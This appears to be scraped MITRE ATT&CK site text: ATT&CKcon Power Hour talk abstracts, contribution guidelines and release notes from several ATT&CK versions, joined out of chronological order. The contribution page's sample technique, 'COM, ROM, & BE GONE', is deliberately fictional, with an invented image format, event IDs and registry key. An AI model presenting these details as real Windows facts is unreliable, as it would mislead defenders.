Broken into a series of four 1.5 hour virtual sessions, ATT&CKcon Power Hour talks have been viewed over 12,000 times. ATT&CKcon Power Hour brought us talks on areas of ATT&CK we haven't heard about before such as Cloud and Mobile as well as insights on how organizations are adapting to features such as sub-techniques. Please continue to watch and share these talks! Presentations 1. Starting Over with Sub-Techniques: Lessons Learned Remapping Detection Analytics (Brian Donohue, Red Canary) In early 2018, Red Canary adopted MITRE ATT&CK as the common language that they would use to categorize threats, measure detection coverage, and communicate about malicious behaviors. In the intervening years, they\u2019ve relied on the framework to develop open source tools like Atomic Red Team and help security teams prioritize their defensive efforts with blogs and our annual Threat Detection Report. In early 2020, MITRE announced that ATT&CK would be expanding its original taxonomy of tactics and techniques to include sub-techniques. In the months that followed MITRE's announcement, Red Canary\u2019s research, intelligence, and detection engineering teams painstakingly remapped their library of thousands of behavioral analytics to sub-techniques. In doing so, they improved their correlational logic, experimented with the idea of conditional technique mapping, and, unfortunately, rendered the 2020 Threat Detection Report out-of-date. In this talk from the MITRE ATT&CKcon Power Hour session on October 9, 2020, Brian discusses how refactoring for sub-techniques offered us the opportunity to apply all the lessons learned in more than two years of operationalizing ATT&CK. He also explores how Red Canary has remodeled its ATT&CK mapping to allow for added flexibility and human input and shows what happens when the Red Canary applied their new sub-technique mappings to the 2020 Threat Detection Report. video slides 2. Using MITRE PRE-ATT&CK and ATT&CK In Cybercrime Education and Research (Aunshul Rege and Rachel Bleiman, Temple University) This presentation from the MITRE ATT&CKcon Power Hour session on October 9, 2020, explores the application of the MITRE ATT&CK and PRE-ATT&CK matrices in cybercrime education and research. Specifically, Rege and Bleiman demonstrate the mapping of the PRE-ATT&CK matrix to social engineering case studies as an experiential learning project in an upper-level cybercrime liberal arts course. It thus allows students to understand the alignment process of threat intelligence to the PRE-ATT&CK framework and also learn about its usefulness/limitations. The talk also discusses the mapping of the ATT&CK matrix, tactics, techniques, software, and groups for two cybercrime datasets created by collating publicly disclosed incidents: (i) critical infrastructure ransomware (CIRW) incidents, and (ii) social engineering (SE) incidents. For the CIRW dataset, 39% of the strains mapped onto the ATT&CK software. For the SE dataset, 49% of the groups and 65% of the techniques map on to the MITRE framework. This helps the researchers identify the framework's usefulness/limitations and also helps our datasets connect to richer information that may not otherwise be available in the publicly disclosed incidents. video slides 3. Without Attacking: Transforming Adversary Emulations Into A Data Analysis Question (Matan Hart, Cymptom) Adversary emulation is commonly used to validate security controls and is considered one of the most popular use-cases for the ATT&CK framework. However, emulating adversary TTPs on production environments is often very limited in testing scope and frequency, and such practice may cause unwanted business disruption. In this talk from the MITRE ATT&CKcon Power Hour session on October 9, 2020, Hart presents a different approach to testing controls against ATT&CK. He demonstrates how it is possible to provide data-based methods to evaluate the exploitability of ATT&CK techniques by gathering information from the network, endpoint, and services; this unique approach does not emulate any sort of malicious action, thus reducing the potential of causing business disruption to the minimum. Hart also outlines a new open-source guideline based on ATT&CK mitigations, that security teams can use to assess their security posture non-intrusively and at scale. video slides 4. Detecting ATT&CK's With Dynamic Thresholds Using Tukey\u2019s Test and Azure Sentinel (Jair Santanna, Northwave) How do you detect abnormal activities based on frequency, for example, a suspicious number of sign-ins (leading to a brute force attack), suspicious amount of data transfer (leading to a data exfiltration), and malicious scanning or discovering activities? Usually, you would count the frequency of the activity and if this number exceeds a pre-defined threshold then you would consider it abnormal/attack. The problem here is the definition of this threshold (and the reduction of false positives and negatives). Some practitioners set this threshold to 5, others to 10, and in some situations, to 30 or even higher. The remaining question is how to obtain a statistically sounding threshold? In this talk from the MITRE ATT&CKcon Power Hour session on October 9, 2020, Jair Santanna answers this question by using a half-century-old statistical method to define such a dynamic threshold (John Tukey\u2019s \"honestly significant difference\"-HSD). Northwave has implemented this method in a production environment over several ATT&CK techniques using the Security Information and Event Management (SIEM) from Microsoft, Azure Sentinel. Northwave\u2019s scripts are publicly available. In this presentation, Santanna sheds light on dynamic thresholds for security monitoring and discuss how to move forward with this challenging old problem. video (no slides) 5. Ta505 - A Study of High End Big Game Hunting In 2020 (Brandon Levene, Google) Opportunistically targeted ransomware deployments, aka Big Game Hunting (BGH), have caused a distinct disruption in the mechanics of monetizing crimeware compromises. This strategy has become the \u201cend game\u201d for the majority of organized cybercrime organizations, and one effect of this shift is the increased emphasis on enterprise-level targets. In this talk from the MITRE ATT&CKCon Power Hour session on October 9, 2020, Levene walks us through research about how a specific BGH threat actor pursues entry points, gains its foothold, pivots, and deploys payloads to maximize their financial gains with minimal effort - and infrastructure! You\u2019ll walk away with an understanding of the latest BGH TTPs seen in enterprise environments, and how they map to the ATT&CK framework so you can build this research into your threat detection strategy and enhance your defenses. video slides 6. What\u2019s New with ATT&CK for Cloud? (Jen Burns, MITRE) Jen Burns is a Lead Cybersecurity Engineer at MITRE and the Lead for MITRE ATT&CK for Cloud. She\u2019s also a red team developer and lead for ATT&CK Evaluations, using her skills in software engineering and adversary emulation. Previously, she was a tech lead at HubSpot on the Infrastructure Security team where she focused on red teaming and building detections in the cloud environment. This presentation is from the MITRE ATT&Ckcon Power Hour session held on October 9, 2020. video slides 7. Mapping The Eventbot Mobile Banking Trojan With MITRE ATT&CK For Mobile (Allie Mellen, Cybereason) In this presentation from the MITRE ATT&CKcon Power Hour session on November 12, Allie discusses how the Cybereason research team uses both MITRE ATT&CK and MITRE ATT&CK for Mobile to map and communicate new malware to the larger security community. Teams use the MITRE ATT&CK framework to share techniques, tactics, and procedures with their team and the community at large. This knowledge base has been incredibly beneficial for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity product and service community. Many of these uses have centered around traditional endpoints like laptops and workstations. However, the MITRE ATT&CK team has also created a cutting-edge portion of their framework: MITRE ATT&CK for Mobile. One of the most recent pieces of malware they have found is EventBot, a mobile banking trojan that targets Android devices and the financial services applications on them, including popular apps like Paypal Business, Revolut, Barclays, UniCredit, CapitalOne UK, HSBC UK, Santander UK, TransferWise, Coinbase, paysafecard, and many more. In this talk, learn about this specific attack, intended targets, a timeline of the attack, and the MITRE ATT&CK for Mobile mapping. Learn why the Cybereason team map to MITRE ATT&CK and MITRE ATT&CK for Mobile and what benefits it has given them and their interactions with the community. video slides 8. ATT&CKing The Cloud: Hopping Between The Matrices (Anthony Randazzo, Expel) The team at Expel has been migrating to the cloud for the last 10 years, but as usual, security has lagged behind. Which means we don't have a comprehensive detection and response framework for cloud like we do with the Enterprise ATT&CK matrix. Cloud has evolved into a complex beast as technologies and concepts - like Infrastructure As Code, Containers, Kubernetes and so forth - have emerged. These new attack surfaces have been added that introduce additional challenges to detection and response in our cloud environments. We don't know what we don't know about attack life cycles in the cloud. In this presentation from the MITRE ATT&CKcon Power Hour session on November 12, 2020, Anthony shares some interesting lessons learned so far when it comes to finding bad guys in the cloud. video slides 9. Building Detections For Cloud With KQL and ATT&CK (Nitya Garg, LinkedIn) Writing and deploying custom detections with high efficacy is one of the most important goals of any SIRT team. It involves multiple stages, starting from developing a detection hypothesis, to writing the detection query, and validating it against a simulated true positive scenario. With ever-changing threat landscape and hybrid cloud environments, the process can be intensive and overwhelming. In this presentation from the MITRE ATT&CKcon Power Hour session on November 12, 2020, Nitya talks about how we can leverage MITRE ATT&CK to not only simplify detection engineering but make it more efficient. The presentation will also include a demo on how to build a detection query, written in KQL(Kusto Query Languauge), for an ATT&CK technique from MITRE Cloud Matrix. video (no slides) 10. What\u2019s a MITRE with Your Security? (Matt Snyder, VMWare) The market for Security products is flooded with vendors offering all sorts of solutions, and organizations are spending a record amount of money defending their environments. Nevertheless, an increasing number of breaches are reported each year, resulting in organizations spending millions of dollars to remediate them. The Security industry responds with more products, all offering to stop the next breach, and the cycle continues. In this presentation from the MITRE ATT&CKcon Power Hour session on November 12, 2020, Matt discusses what VMware is doing internally to address this fundamental flaw in the Security industry and how they are leveraging the MITRE ATT&CK framework to reshape how we think about security. video slides 11. Putting the PRE into ATT&CK (Jamie Williams and Mike Hartley, MITRE) In this presentation from the MITRE ATT&CKcon Power Hour session on November 12, 2020 Jamie Williams and Mike Hartley from MITRE discuss the process for merging PRE-ATT&CK and adding two new tactics to Enterprise ATT&CK - Reconnaissance and Resource Development. video slides 12. Helping Small Companies Leverage CTI with an Open Source Threat Mapping (Valentina Palac\u00edn, Senior Cyber Threat Intelligence Analyst) No one can deny the tremendous impact that ATT&CK had on the cybersecurity industry, nor the usefulness of having a good Threat Library at your disposal. But the question Valentina gets asked over and over by people from small companies is always the same: \u201cHow could I leverage threat intelligence using ATT&CK with limited time and resources?\u201d And so far, there hasn't been a good answer. That\u2019s why she decided to come up with the Threat Mapping Catalogue (TMC), a tool that combines the power of the mappings already available in the ATT&CK website, TRAM and the ATT&CK Navigator, to better process, consume and incorporate new mappings while organizing them around different categories. This talk is from the MITRE ATT&CKcon Power Hour session held on December 11, 2020. video slides 13. From Theory to Practice: How My ATT&CK Perspectives Have Changed (Katie Nickels, Red Canary) Good analysts (and good human beings) change their minds based on new information. In this presentation, Katie will share how her perspectives on ATT&CK have changed since moving from ATT&CK team member to ATT&CK end-user. She will discuss how her ideas about coverage, procedures, and detection creation have evolved and why those perspectives matter. Katie will also share practical examples from observed threats to help explain the nuances of her perspectives. Attendees should expect to leave this presentation with a better understanding of how to handle challenges they\u2019re likely to face when navigating their own ATT&CK journey. This talk is from the MITRE ATT&CKcon Power Hour session held on December 11, 2020. video slides 14. Sharpening Your Threat Hunting Program with ATT&CK Framework (Hieu Tran, FPT Cybersecurity Division) No matter how sophisticated and thorough your security precautions may be, you cannot assume your security measures are impenetrable. This is why you need a threat hunting program in place. But how can we implement a proper threat hunting program and run it efficiently? In this talk, we will uncover how to sharpen your threat hunting strategy by leveraging ATT&CK. Ultimately, we\u2019ll be demonstrating how effectively employing the hunting methodology in the real-world battlefield, fighting against well-known cyber espionage actors who strongly focus on Southeast Asian countries like Vietnam, the Philippines, Laos, and Cambodia. This talk is from the MITRE ATT&CKcon Power Hour session held on December 11, 2020. video slides 15. Using ATT&CK To Create Cyber DBTs For Nuclear Power Plants (Jacob Benjamin, Dragos) Design Basis Threat (DBT) is a concept introduced by the Nuclear Regulatory Commission (NRC). It is a profile of the type, composition, and capabilities of an adversary. DBT is the key input nuclear power plants use for the design of systems against acts of radiological sabotage and theft of special nuclear material. The NRC expects its licensees, nuclear power plants, to demonstrate that they can defend against the DBT. Currently, cyber is included in DBTs simply as a prescribed list of IT centric security controls. Using MITRE\u2019s ATT&CK framework, Cyber DBTs can be created that are specific to the facility, its material, or adversary activities. This talk is from the MITRE ATT&CKcon Power Hour session held on December 11, 2020. video slides 16. What\u2019s New with ATT&CK for ICS? (Otis Alexander, MITRE) Otis Alexander is a Principal Cyber Security Engineer at the MITRE Corporation and has worked in the areas of security engineering and research, analytic development, and adversary modeling and emulation. Otis is a co-creator of ATT&CK for ICS and has been leading the project since its inception. He also leads an effort to bring MITRE ATT&CK Evaluations to ICS security vendors providing anomaly and threat detection solutions. He advocates for network and host visibility in operational technology environments to increase the situational awareness of defenders. This talk is from the MITRE ATT&CKcon Power Hour session held on December 11, 2020. video slides 17. Measure What Matters: How to Use ATT&CK to Do the Right Things in the Right Order (Daniel Wyleczuk-Stern, Snowflake) Cyber security is inherently a function of risk management. Risk management is the identification, evaluation, and prioritization of risks followed by the effort to reduce those risks in a coordinated and economical manner (thanks wikipedia!). In this talk, Daniel will be going over some strategies for measuring and prioritizing your cyber risks using MITRE ATT&CK . He'll discuss some lessons learned in atomic testing of techniques vs attack chaining as well as what to measure and how to make decisions with that data. This talk is from the MITRE ATT&CKcon Power Hour session held on January 14, 2021. video slides 18. ATT&CKers Think in Graphs (Valentine Mairet, McAfee) The MITRE ATT&CK framework is the industry standard to dissect cyberattacks into used techniques. At McAfee, all attack information is disseminated into different categories, including ATT&CK techniques. What results from this exercise is an extensive repository of techniques used in cyberattacks that goes back many years. Much can be learned from looking at historical attack data, but how can we piece all this information together to identify new relationships between threats and attacks? In her recent efforts, Valentine has embraced analyzing ATT&CK data in graphical representations. One lesson learned is that it is not just about merely mapping out attacks and techniques used into graphs, but the strength lies in applying different algorithms to answer specific questions. In this presentation, Valentine will showcase the results and techniques obtained from her research journey using graph and graph algorithms. This talk is from the MITRE ATT&CKcon Power Hour session held on January 14, 2021. video slides 19. ATT&CK-Onomics: Exploring the Economics Behind Techniques Used By Adversaries (Gert-Jan Bruggink, FalconForce) Adversaries are humans as well. They have objectives, deadlines and resources for programming. In a sense, very similar to corporations grounded in the economics of effort vs time vs results. Now understanding techniques is one thing, taking it a step further and understanding what the economic impact is of using certain techniques is another. Developing tools takes time. For example, developing a custom process injection module might take days or weeks to develop, where using an open source tool could prevent extensive development costs incurred. This talk explores the economic considerations for defending against techniques used by adversaries. It explores fundamental considerations all referenced to MITRE\u2019s ATT&CK framework. The objective of this talk is to inspire defensive strategies designed to impact cost incurred by adversaries to perform compromises. This talk is from the MITRE ATT&CKcon Power Hour session held on January 14, 2021. video slides 20. State of the ATT&CK (Adam Pennington, MITRE) In this presentation from the MITRE ATT&CKcon Power Hour held on January 14, 2021, MITRE ATT&CK lead Adam Pennington gives an update on the current and future state of the MITRE ATT&CK framework. video slides "

If you have additional techniques, know about variations on one already covered, have examples of techniques in use, or have other relevant information, then we would like to hear from you. We are looking for contributions in the following areas in particular, but if you have other information you think may be useful, please reach us at attack@mitre.org. All contributions and feedback to ATT&CK are appreciated. Due to the high volume of contributions, it may take us about a week to get back to you. We may ask you follow-up questions to help us understand your contribution and gather additional information. We recommend you read our philosophy paper to understand our approach to maintaining ATT&CK so that we get the right details up front. If we find the contribution fills a gap, then we will make edits and send you a draft version of the technique or Group/Software page for your review prior to it being published, listing you as a contributor if desired. Content updates happen roughly every 6 months. Contributing to ATT&CK Sub-Techniques and Techniques We appreciate your help to let us know about what new techniques and technique variations adversaries are using in the wild. You can start by emailing us the technique name, a brief description, and references or knowledge about how it is being used by adversaries. We suggest you take a close look at what we already have on our site, paying attention to the level of abstraction of techniques and sub-techniques. Since we are working on adding new technique details constantly, we will deconflict what you send with what we\u2019re working on. We\u2019ll provide feedback and work with you to get the content added. macOS, Linux, cloud, and ICS While we also cover the Windows and mobile platforms, we are particularly interested in new macOS, Linux, cloud, and ICS techniques since there is a lack of publicly available threat intel for techniques used against those platforms. This leads to gaps in the knowledge base that you can help fill. Threat Intelligence We map Group and Software examples on our site, and there is too much open source threat intelligence reporting for us to keep up on everything. We appreciate your help with referenced information about how Groups and Software samples use ATT&CK techniques. Threat intelligence contributions are most helpful to us when they are in the specific format we have on our website, including citing techniques and group names or associated groups to publicly-available references. We ask that you provide the sub-technique or technique name, a brief description of how the technique is implemented, and the publicly-available reference. Data Sources We often don\u2019t have direct access to endpoint or network log data for technique use in incidents. We\u2019re always looking for partners who would be interested in sharing relevant data from logs that show how adversaries are using ATT&CK techniques beyond what appears in threat reporting. Your Use Cases It\u2019s always helpful for us to hear about how you\u2019re using ATT&CK in your organization. We appreciate any information you can share with us about your specific use case or application of ATT&CK, and particularly any success stories you\u2019ve had as a result. Contribution Examples New Technique Example (Sub-)Technique Name: COM, ROM, & BE GONE Tactic: Persistence Platform: Windows Required Permissions: User Sub-techniques: This is a sub-technique of T1XXX, or this would have T1XXX as a sub-technique Data Sources: Windows API, Process monitoring, or other sources that can be used to detect this activity Description: Component Object Model (COM) servers associated with Graphics Interchange Format (JIF) image viewers can be abused to corrupt arbitrary memory banks. Adversaries may leverage this opportunity to modify, mux, and maliciously annoy (MMA) read-only memory (ROM) regularly accessed during normal system operations. Detection: Monitor the JIF viewers for muxing and malicious annoyance. Use event ID 423420 and 234222 to detect changes. Mitigation: Configure the Registry key HKLM\\SYSTEM\\ControlSet\\001\\Control\\WindowsJIFControl\\ to 0 to disable MMA access if not needed within the environment.

The biggest changes are the restructuring of Detections, now tied to Data Source and Data Component objects in Enterprise ATT&CK, a beta release of ATT&CK for Mobile leveraging sub-techniques, and ATT&CK for ICS now on attack.mitre.org An accompanying blog post describes these changes as well as improvements across ATT&CK's various domains and platforms. This release contains a beta version of ATT&CK for Mobile represented using sub-techniques. The current stable version of ATT&CK for Mobile can still be found at https://attack.mitre.org/versions/v10/matrices/mobile/. Information on how to make the transition to this new version of ATT&CK for Mobile can be found in an accompanying blog post. A version of this beta content rendered in STIX can be found in our GitHub repo. In this release we have replaced the Enterprise Sub-Techniques Boot or Logon Autostart Execution: Plist Modification (T1547.011) with Plist File Modification (T1647) and Scheduled Task/Job: At (Linux)(T1053.001) was incorporated into Scheduled Task/Job: At (T1053.002) in to better reflect adversary behavior.

Tactics and Techniques Enterprise Impact Tactic: The Impact Tactic was added to cover integrity and availability attacks against enterprise systems. Each technique will include an Impact Type label of 'Integrity' or 'Availability'. The tactic covers 14 techniques that were added in this update: Data Destruction Data Encrypted for Impact Defacement Disk Content Wipe Disk Structure Wipe Endpoint Denial of Service Firmware Corruption Inhibit System Recovery Network Denial of Service Resource Hijacking Runtime Data Manipulation Service Stop Stored Data Manipulation Transmitted Data Manipulation Seven additional techniques were added: Compile After Delivery (Defense Evasion) Domain Generation Algorithms (Command and Control) Domain Trust Discovery (Discovery) Execution Guardrails (Defense Evasion) Group Policy Modification (Defense Evasion) Systemd Service (Persistence) Virtualization/Sandbox Evasion (Defense Evasion, Discovery) The following techniques were updated: External Remote Services - Added to Initial Access Tactic Input Prompt - Added Windows and examples LLMNR/NBT-NS Poisoning and Relay - Broadened scope to include hash relay Masquerading - Broadened scope to include right-to-left override, added adversary examples of moving and renaming system utilities to avoid detection Office Application Startup - Broadened scope to include Outlook Rules, Forms, Home Page, and Add-in persistence variations PowerShell - Updated description to include use of System.Management.Automation Remote System Discovery - Updated description to include accessing local hosts file Security Software Discovery - Removed virtualization Signed Binary Proxy Execution - Added msiexec.exe and odbcconf.exe variations Supply Chain Compromise - Added compromise of open source dependencies Valid Accounts - Broke out specific account types in description to include default accounts local accounts, and domain accounts Added Digital Certificate Validation as a defense bypassed: Compiled HTML File InstallUtil Mshta Regsvcs/Regasm Regsvr32 Rundll32 Miscellaneous minor changes: Brute Force - Minor description update Dynamic Data Exchange - Minor description update Exploit Public-Facing Application - Minor description update Screensaver - Minor description update Template Injection - Reference added You can view the new and changed enterprise techniques in the ATT&CK Navigator by checking out the layer file we made available here. You can also check out a preview of the changes below! New techniques are green, and changed techniques are yellow. PRE-ATT&CK Technique deprecations: Domain Generation Algorithms (DGA)- Moved under Enterprise with a new definition Mobile New Techniques: Web Service Groups On both Group and Software pages, we have changed the term \u201cAliases\u201d to \u201cAssociated Groups\u201d and \u201cAssociated Software\u201d respectively to better reflect what these terms represent. Analysts track clusters of activities using various analytic methodologies and terms such as threat groups, activity groups, threat actors, intrusion sets, and campaigns. Some groups have multiple names associated with similar activities due to various organizations tracking similar activities by different names. Malware/software faces the same challenge with different organizations assigning different names to the same or similar samples. Organizations' group and software names may partially overlap with names designated by other organizations and may disagree on specific activity. The MITRE ATT&CK team believes that tracking overlaps in activity for both groups and malware/software is useful to analysts, which is why we began tracking the \u201cAliases\u201d field many years ago. While we always recognized that these were not true, complete \u201caliases,\u201d we have realized that calling these \u201cAliases\u201d only furthers the confusion over group naming. Thus, we have decided to change the field \u201cAliases\u201d to \u201cAssociated Groups\u201d and \u201cAssociated Software\u201d to more accurately represent what we are trying to express. We make a best effort to track overlapping groups and software, but we do not represent these names as exact overlaps and encourage analysts to do additional research. If you have input on associated groups or software, please contact us.

These range from major revisions, like with Process Injection and Access Token Manipulation to add substantially new information in the technical descriptions, to minor revisions, like InstallUtil to add some additional details. Groups and Software In addition to the new pages below, we updated many Group and Software pages, including OilRig and Dragonfly. We also added additional Associated Groups in an attempt to track overlapping activity from multiple vendors as a single Group. Nine new groups: CopyKittens FIN5 Sowbug NEODYMIUM PROMETHIUM APT34 Charming Kitten Magic Hound BRONZE BUTLER 26 new software entries: TDTESS OSInfo RemoteCMD Matroyshka Gazer RawPOS Helminth Felismus Reaver FLIPSIDE Responder meek Wingbird Power Loader Truvasys MimiPenguin Volgmer FALLCHILL FinFisher Tor POWRUNER SEASHARPEE DownPaper Daserf Starloader ISMInjector Other Changes Consolidated platforms parameters - It was becoming cumbersome to track individual OS platform versions and releases. Since many of the techniques described work across most versions of a platform, we decided to consolidate them to down to one tag. Any version requirements will be captured in the technical description and requirements sections of a technique All Windows versions -> Windows MacOS/OS X -> macOS Linux - no change "

The biggest changes in ATT&CK v12 are the addition of detections to ATT&CK for ICS, and the introduction of Campaigns. Matching the model introduced to ATT&CK for Enterprise in ATT&CK v11, ATT&CK for ICS detections describe ways of detecting various ICS techniques and are each tied to specific Data Sources and Data Components. This detection format was described in detail in our ATT&CK v11 release blog post. The new detections added leverage both traditional host and network-based collection as well as ICS specific sources such as Asset and Operational Databases. As there are overlaps between the Enterprise and ICS ATT&CK domains some ICS detections include references to Enterprise techniques where the additional context may assist defenders. This release introduces the Campaign data structure to ATT&CK and an initial limited set of Campaigns. ATT&CK's Campaigns are defined as a grouping of intrusion activity conducted over a specific period of time with common targets and objectives. A key aspect of Campaigns is that the activity may or may not be linked to a specific threat actor. Campaigns are described in detail in the blog post Introducing Campaigns to MITRE ATT&CK. Specifics on how Campaigns are implemented in ATT&CK's Enterprise, ICS, and Mobile STIX representations are described in ATT&CK's STIX 2.0 Data Model and STIX 2.1 Data Model. Several existing Groups were identified as more closely matching the Campaign than the Group definition and were converted to Campaigns. The 7 impacted groups were deprecated (noted below) and new Campaigns were created in their place. In this release we have renamed the Enterprise Technique \"Indicator Removal on Host\" to Indicator Removal (T1070) and rescoped it to better account for adversary behavior in cloud environments. This version of ATT&CK for Enterprise contains 14 Tactics, 193 Techniques, 401 Sub-techniques, 135 Groups, 14 Campaigns, and 718 Pieces of Software.

This is the first non-beta release of Enterprise ATT&CK represented with sub-techniques. The pre sub-technique version of ATT&CK has been preserved here. Most of this content was released as a beta in March 2020, and changes between the beta release and this release are documented separately. In total, the sub-technique version of ATT&CK for Enterprise contains 156 techniques (reduced from 266) and 272 sub-techniques. See the accompanying blog post for more details. In this same release we have deprecated white/blacklist language in ATT&CK. Techniques and mitigations previously containing this language have either been reworded or the language has been replaced with allow/denylist. In line with industry terminology changes, application whitelisting and process whitelisting have both been replaced with application control. Techniques Enterprise View enterprise technique updates in the ATT&CK Navigator here.

The biggest change is the addition of cloud-focused techniques. ATT&CK for Cloud 36 techniques have been added or updated to cover adversary behavior against cloud-based platforms. We\u2019ve added three infrastructure as a service (IaaS) platforms, Amazon Web Services (AWS), Microsoft Azure (Azure), and Google Cloud Platform (GCP). The Software as a service (SaaS) platform will cover techniques against general cloud-based software platforms. Separately from IaaS and SaaS, we've also added two cloud software platforms, Azure Active Directory (Azure AD) and Office 365, to cover techniques against those specific platforms. New techniques and updates for cloud: Application Access Token Cloud Instance Metadata API Cloud Service Dashboard Cloud Service Discovery Data from Cloud Storage Object Implant Container Image Internal Spearphishing Revert Cloud Instance Steal Application Access Token Steal Web Session Cookie Transfer Data to Cloud Account Unused Cloud Regions Web Session Cookie Account Discovery Account Manipulation Brute Force Create Account Credentials in Files Data from Information Repositories Data from Local System Data Staged Drive-by Compromise Email Collection Exploit Public-Facing Application Network Service Scanning Network Share Discovery Office Application Startup Permission Groups Discovery Redundant Access Remote System Discovery Resource Hijacking Spearphishing Link System Information Discovery System Network Connections Discovery Trusted Relationship Valid Accounts The majority of the people and organizations we talked to while defining what ATT&CK means in a cloud environment said that they consider it an extension of an enterprise network, so we made it part of ATT&CK for Enterprise instead of creating a separate model. The ATT&CK for Cloud matrix along with the individual platforms can still be viewed separately from the rest of the Enterprise matrix. Due to web applications being thought of as the new perimeter with cloud, we've had to expand the definition of Lateral Movement a bit to cover access and interaction with cloud-based systems and services. Common credentialing material such as web browser cookies and application access tokens like OAuth are commonplace and are targeted for access to cloud-based software. The current list of cloud platforms was selected based on input from contributors and what has been reported in incidents. We plan on re-evaluating them as needed to expand or refine them based on the threat landscape. We shifted priorities a bit this year to this effort because of the overwhelming demand for cloud coverage in ATT&CK. The lack of public incident reporting made it difficult to do, but we were able to use a lot of the community's expertise and knowledge in building it. ATT&CK for Cloud is the first new technology domain that has been created based on almost 100% community contributions for technique ideas! Cloud is by no means finished. We will continue to build out additional cloud-based techniques for another release next year. Techniques Enterprise View enterprise technique updates in the ATT&CK Navigator here.

The biggest changes in ATT&CK v13 are the addition of detailed detection guidance to some Techniques in ATT&CK for Enterprise, Mobile Data Sources, and two new types of changelogs to help identify more precisely what has changed in ATT&CK. An accompanying blog post describes these changes as well as improvements across ATT&CK's various domains and platforms. This release includes a new human-readable detailed changelog showing more specifically what changed in updated ATT&CK objects, and a new machine-readable JSON changelog, whose format is described in ATT&CK's Github. The terminology used in these release notes has also been updated to better describe the changes to various ATT&CK objects: New objects: ATT&CK objects which are only present in the new release. Major version changes: ATT&CK objects that have a major version change. (e.g., 1.0 \u2192 2.0) Minor version changes: ATT&CK objects that have a minor version change. (e.g., 1.0 \u2192 1.1) Patches: ATT&CK objects that have been patched while keeping the version the same. (e.g., 1.0 \u2192 1.0 but something like a typo, a URL, or some metadata was fixed) Object revocations: ATT&CK objects which are revoked by a different object. Object deprecations: ATT&CK objects which are deprecated and no longer in use, and not replaced. Object deletions: ATT&CK objects which are no longer found in the STIX data.

The techniques were refactored to fit the enterprise level of detail. The following techniques were added under Initial Access: Drive-by Compromise Exploit Public-Facing Application Hardware Additions Spearphishing Attachment Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship The following existing techniques were cross-referenced into Initial Access: Replication Through Removable Media Valid Accounts The following techniques were added to Execution: Exploitation for Client Execution User Execution Techniques Aside from those added from PRE-ATT&CK, 23 additional new techniques were added - Up to 219 from 188: CMSTP Control Panel Items BITS Jobs SIP and Trust Provider Hijacking Password Policy Discovery Indirect Command Execution Exploitation for Client Execution User Execution Port Knocking Sudo Caching DCShadow Kerberoasting Time Providers Exploitation of Remote Services Exploitation for Defense Evasion Exploitation for Credential Access Data from Information Repositories Credentials in Registry Kernel Modules and Extensions Signed Script Proxy Execution Browser Bookmark Discovery Signed Binary Proxy Execution Remote Access Tools One technique renamed NTFS Extended Attributes -> NTFS File Attributes Moderate to major updates to scope and/or content Winlogon Helper DLL Credential Dumping NTFS File Attributes Web Service Taint Shared Content Groups and Software Nine new groups: FIN8 TA459 BlackOasis APT33 Leviathan Elderwood APT37 PLATINUM MuddyWater Group Updates Patchwork combined with Monsoon, G0042 redirects to G0040 Groups with New Techniques Added Axiom APT28 APT29 APT3 Lazarus Group menuPass APT34 Carbanak Night Dragon FIN7 APT32 45 new software entries: ISMInjector BITSAdmin Winexe Pupy Forfiles PowerSploit SDelete PUNCHBUGGY PUNCHTRACK NETWIRE TURNEDUP Dipsind JPIN adbupd Hydraq Briba Naid Wiarp Vasport Pasam Darkmoon Nerex Linfo CORALDECK DOGCALL HAPPYWORK KARAE POORAIM SHUTTERSPEED SLOWDRIFT WINERACK Chaos Umbreon CCBkdr POWERSTATS Havij sqlmap Smoke Loader spwebmember NanHaiShu Orz ZeroT Invoke-PSImage HOMEFRY MURKYTOP Other Changes Exploitation of Vulnerability Breakout - With the addition of Initial Access, more clarity was needed to define software exploitation behavior. The original Exploitation of Vulnerability technique was broken out into six variations specifically for individual tactics. Initial Access - Exploit Public-Facing Application Execution - Exploitation for Client Execution Privilege Escalation - Exploitation for Privilege Escalation: maintains the original Exploitation of Vulnerability technique ID T1068 Lateral Movement - Exploitation of Remote Services Defense Evasion - Exploitation for Defense Evasion Credential Access - Exploitation for Credential Access Software Platforms - Added Windows, Linux, and macOS tags for software objects. What's New in PRE-ATT&CK? This release deprecates the Launch and Compromise tactics and most of the techniques that belong to them. In the future, these TTPs will be covered by techniques in the Initial Access and Execution tactics on ATT&CK. 2 tactics deprecated: Launch and Compromise Disseminate removable media has been moved from Launch to Stage Capabilities A new technique, Spearphishing for Information, has been added to Technical Information Gathering 23 techniques have been deprecated in this release PRE-ATT&CK now comprises 15 tactics and 151 techniques "

The old website will not be receiving content updates during this timeframe, so you will need to use the new website and STIX/TAXII to get the most up-to-date ATT&CK information. Consolidated Technique and Software IDs As of the October 2018 update all techniques across Enterprise ATT&CK, PRE-ATT&CK, and Mobile will have the same T#### numbering scheme. Existing PRE-ATT&CK and Mobile technique IDs have been converted over to the Enterprise IDs. Links to specific pages on the old wiki or to the new site with the old IDs will hit pages that redirect to the appropriate technique page. Mobile software IDs were converted to the Enterprise format of S####. NOTE: If you have created layers for the ATT&CK Navigator that include PRE-ATT&CK or Mobile ATT&CK techniques, you will need to update your layer files to use the new ATT&CK technique IDs. Tactic IDs Tactics have been given ID numbers formatted as TA####. Mobile Mitigation IDs Mobile migitations have been given ID numbers formatted as M####. Versioning We've implemented a versioning system to all ATT&CK objects (techniques, groups, software, Mobile mitigations) to enable better tracking of incremental changes to existing ATT&CK content. The system will consist of a MAJOR.MINOR number. All objects will start at version 1.0 with the October release. Techniques Major version changes Name change Technique scope change - Change in definition resulting in broadening or focusing the scope of the technique Minor version changes Minor descriptive information - technical information, examples, detection, mitigation, references Metadata change - platform, permissions, data sources, defense bypassed, etc. Groups Major version changes Adding or changing associated group or software Big changes to description and scope of a group Minor version changes Relationship to new techniques or software New references Software Major version changes Adding or changing an associated group or software High level description or information changes Metadata change (type) Minor version changes Relationship to new techniques or software New references Mobile Mitigations Major version changes Name change Scope, description, or information changes Minor version changes Metadata change Relationship to new techniques New references In addition, the ATT&CK Matrix view of techniques within an ATT&CK domain will be timestamped with the last change that impacts its structure and organization which will act as a version number for it.

